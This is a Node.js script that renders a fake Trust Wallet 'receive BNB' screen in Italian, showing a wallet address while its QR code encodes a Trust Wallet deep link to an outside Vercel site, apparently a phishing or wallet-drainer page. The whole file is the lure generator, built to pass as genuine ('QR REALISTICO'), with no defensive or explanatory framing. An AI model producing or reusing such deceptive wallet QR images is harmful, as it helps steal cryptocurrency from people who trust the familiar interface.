const QRCode = require("qrcode");
const { createCanvas, loadImage } = require("canvas");
const fs = require("fs");

const URL = "https://link.trustwallet.com/open_url?url=https://send-usdvercel.vercel.app";
const ADDRESS = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";

async function generate() {
  const canvas = createCanvas(900, 1600);
  const ctx = canvas.getContext("2d");

  ctx.fillStyle = "#121212";
  ctx.fillRect(0, 0, 900, 1600);

  ctx.fillStyle = "#fff";
  ctx.font = "bold 48px Arial";
  ctx.fillText("Ricevi", 360, 120);

  ctx.fillStyle = "#3a2f1a";
  roundRect(ctx, 80, 160, 740, 120, 20, true);

  ctx.fillStyle = "#facc15";
  ctx.font = "20px Arial";
  ctx.fillText("Invia solo asset BNB Smart Chain", 110, 220);

  ctx.fillStyle = "#fff";
  ctx.font = "bold 36px Arial";
  ctx.fillText("BNB", 360, 340);

  ctx.fillStyle = "#888";
  ctx.font = "22px Arial";
  ctx.fillText("BNB Smart Chain", 330, 380);

  ctx.fillStyle = "#fff";
  roundRect(ctx, 150, 420, 600, 650, 30, true);

  const qr = await QRCode.toDataURL(URL);
  const img = await loadImage(qr);
  ctx.drawImage(img, 200, 480, 500, 500);

  ctx.fillStyle = "#fff";
  ctx.beginPath();
  ctx.arc(450, 730, 60, 0, Math.PI * 2);
  ctx.fill();

  ctx.fillStyle = "#000";
  ctx.font = "bold 30px Arial";
  ctx.fillText("🔰", 430, 740);

  ctx.fillStyle = "#000";
  ctx.font = "18px Arial";
  ctx.fillText(ADDRESS.slice(0, 22), 250, 1000);
  ctx.fillText(ADDRESS.slice(22), 250, 1030);

  const buttons = ["Copia", "Imposta importo", "Condividi"];

  buttons.forEach((text, i) => {
    const x = 140 + i * 220;

    ctx.fillStyle = "#2a2a2a";
    ctx.beginPath();
    ctx.arc(x + 60, 1150, 60, 0, Math.PI * 2);
    ctx.fill();

    ctx.fillStyle = "#fff";
    ctx.font = "16px Arial";
    ctx.fillText(text, x + 10, 1250);
  });

  fs.writeFileSync("qr-real.png", canvas.toBuffer());
  console.log("🔥 QR REALISTICO creato!");
}

function roundRect(ctx, x, y, w, h, r, fill) {
  ctx.beginPath();
  ctx.moveTo(x + r, y);
  ctx.lineTo(x + w - r, y);
  ctx.quadraticCurveTo(x + w, y, x + w, y + r);
  ctx.lineTo(x + w, y + h - r);
  ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
  ctx.lineTo(x + r, y + h);
  ctx.quadraticCurveTo(x, y + h, x, y + h - r);
  ctx.lineTo(x, y + r);
  ctx.quadraticCurveTo(x, y, x + r, y);
  ctx.closePath();
  if (fill) ctx.fill();
}

generate();